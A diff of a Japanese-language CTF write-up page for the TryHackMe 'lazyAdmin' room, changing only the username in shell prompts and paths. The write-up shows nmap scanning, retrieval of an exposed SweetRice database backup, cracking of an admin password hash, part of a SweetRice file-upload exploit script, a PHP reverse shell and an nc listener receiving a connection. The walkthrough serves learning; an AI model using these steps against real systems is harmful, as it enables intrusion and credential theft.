@@ -28,7 +28,7 @@
     
     <article class="writeup-body">
       <p><code>nmap</code></p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.49.169.227 -T4 -sVC        
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 09:04 +0900
 Nmap scan report for 10.49.169.227
@@ -48,12 +48,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
 
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ 
 </code></pre>
 <p><code>ssh</code>と<code>http</code>のポートが開いている</p>
 <p><code>--script=vuln</code></p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.49.169.227 --script=vuln
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 08:59 +0900
 Nmap scan report for 10.49.169.227
@@ -70,17 +70,17 @@ PORT   STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 375.72 seconds
 
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ 
 </code></pre>
 <p><code>/content</code>という興味深いフォルダを発見</p>
 <p><code>whatweb</code>でバージョン確認</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ whatweb http://10.49.169.227/content
 http://10.49.169.227/content [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.169.227], RedirectLocation[http://10.49.169.227/content/], Title[301 Moved Permanently]                                                                      
 http://10.49.169.227/content/ [200 OK] Apache[2.4.18], Cookies[sweetrice], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.169.227], Script[text/javascript], Title[Welcome to SweetRice - Thank your for install SweetRice as your website management system.]            
 
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ 
 </code></pre>
 <p><code>SweetRice</code>というサービス名を得た<br>
@@ -90,7 +90,7 @@ http://10.49.169.227/content/ [200 OK] Apache[2.4.18], Cookies[sweetrice], Count
 </code></pre>
 <p><code>/content/as/</code>というページを発見<br>
 アクセスしてみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ curl http://10.49.169.227/content/as/          
 &lt;!DOCTYPE html&gt;
 &lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
@@ -209,7 +209,7 @@ function dashboardSignin(){
 </code></pre>
 <p>「Welcome to SweetRice」というタイトルとなんらかのログイン画面があらわれた</p>
 <p>searchsploitでsweetriceを検索した</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ searchsploit sweetrice      
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                            |  Path
@@ -227,10 +227,10 @@ Shellcodes: No Results
 </code></pre>
 <p>手がかりがなく迷子になってしまった</p>
 <p><code>latest.txt</code>というファイルを見つけた</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ curl http://10.49.169.227/content/inc/lastest.txt
 1.5.1                                                                             
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ 
 </code></pre>
 <p><code>1.5.1</code>はsweetriceのバージョンである可能性が高い<br>
@@ -257,7 +257,7 @@ http://localhost/SweetRice-transfer.zip
 /usr/share/exploitdb/exploits/php/webapps/40718.txt (END)
 </code></pre>
 <p><code>/inc/mysql_backup</code>が誰でも落とせる状態になっているらしいので探してみよう</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ curl http://10.49.169.227/content/inc/mysql_backup/
 &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
 &lt;html&gt;
@@ -278,14 +278,14 @@ http://localhost/SweetRice-transfer.zip
 </code></pre>
 <p><code>mysql_bakup_20191129023059-1.5.1.sql</code>というバックファイルであろうファイルを見つけた<br>
 <code>curl -O</code>でこれをダウンロードする</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ curl http://10.49.169.227/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql -O
   % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                  Dload  Upload  Total   Spent   Left   Speed
 100   4809 100   4809   0      0  18337      0  
 </code></pre>
 <p>中身を見てみると</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ cat mysql_bakup_20191129023059-1.5.1.sql 
 &lt;?php return array (
   0 =&gt; 'DROP TABLE IF EXISTS `%--%_attachment`;',
@@ -389,7 +389,7 @@ http://localhost/SweetRice-transfer.zip
   KEY `date` (`date`)
 ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
 );?&gt;                                                                                                                                                            
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ 
 </code></pre>
 <p>見るとこれはSQLのログヒステリーのようだ<br>
@@ -400,7 +400,7 @@ http://localhost/SweetRice-transfer.zip
 crackstation.netに<code>42f749ade7f9e195bf475f37a44cafcb</code>を投げてみる<br>
 →<code>md5</code>形式の<code>Password123</code>であることがわかった</p>
 <p>ここで<code>searchsploit</code>の結果を思い出すと</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ searchsploit sweetrice      
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                            |  Path
@@ -419,7 +419,7 @@ Shellcodes: No Results
 <p>任意のファイルをアップロードできる脆弱性があった<br>
 ログインしたのち、これができれば嬉しい<br>
 <code>-m</code>オプションでカレントディレクトリにコピーして中身を見てみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ searchsploit -m 40716 
   Exploit: SweetRice 1.5.1 - Arbitrary File Upload
       URL: https://www.exploit-db.com/exploits/40716
@@ -427,15 +427,15 @@ Shellcodes: No Results
     Codes: N/A
  Verified: True
 File Type: Python script, ASCII text executable
-Copied to: /home/rkametani/tryhackme/lazyAdmin/40716.py
+Copied to: /home/kali/tryhackme/lazyAdmin/40716.py
 
 
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ ls
 40716.py  hash.txt  mysql_bakup_20191129023059-1.5.1.sql
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ cat 40716.py             
 #/usr/bin/python
 #-*- Coding: utf-8 -*-
@@ -505,7 +505,7 @@ with session() as r:
         print(&quot;[+] File Uploaded...&quot;)
         print(&quot;[+] URL : http://&quot; + host + &quot;/attachment/&quot; + filename)
         pass                                                                                                                                                            
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ 
 
 </code></pre>
@@ -540,18 +540,18 @@ $debug = 0;
 </code></pre>
 <p>とあるのでここを自分のもの変えればよい<br>
 変更はカレントディレクトリにコピーしてから行う</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php5   
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ ls
 40716.py  hash.txt  mysql_bakup_20191129023059-1.5.1.sql  shell.php5
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ 
 </code></pre>
 <p>リスナーを起動</p>
-<pre><code class="language-bash">──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">──(kali㉿kali-1-kalija)-[~]
 └─$ nc -lvnp 1234                   
 listening on [any] 1234 ...
 </code></pre>
@@ -653,7 +653,7 @@ urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='http', port=80): Max 
 During handling of the above exception, another exception occurred:
 
 Traceback (most recent call last):
-  File &quot;/home/rkametani/tryhackme/lazyAdmin/40716.py&quot;, line 52, in &lt;module&gt;
+  File &quot;/home/kali/tryhackme/lazyAdmin/40716.py&quot;, line 52, in &lt;module&gt;
     login = r.post('http://' + host + '/as/?type=signin', data=payload)
   File &quot;/usr/lib/python3/dist-packages/requests/sessions.py&quot;, line 637, in post
     return self.request(&quot;POST&quot;, url, data=data, json=json, **kwargs)
@@ -666,11 +666,11 @@ Traceback (most recent call last):
     raise ConnectionError(e, request=request)
 requests.exceptions.ConnectionError: HTTPConnectionPool(host='http', port=80): Max retries exceeded with url: /10.49.169.227/content/as/?type=signin (Caused by NameResolutionError(&quot;HTTPConnection(host='http', port=80): Failed to resolve 'http' ([Errno -2] Name or service not known)&quot;))                           
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/lazyAdmin]
 └─$ 
 </code></pre>
 <p>ふつうにGUIからアップロードしよかな</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nc -lvnp 1234                   
 listening on [any] 1234 ...
 connect to [192.168.205.211] from (UNKNOWN) [10.49.169.227] 32880
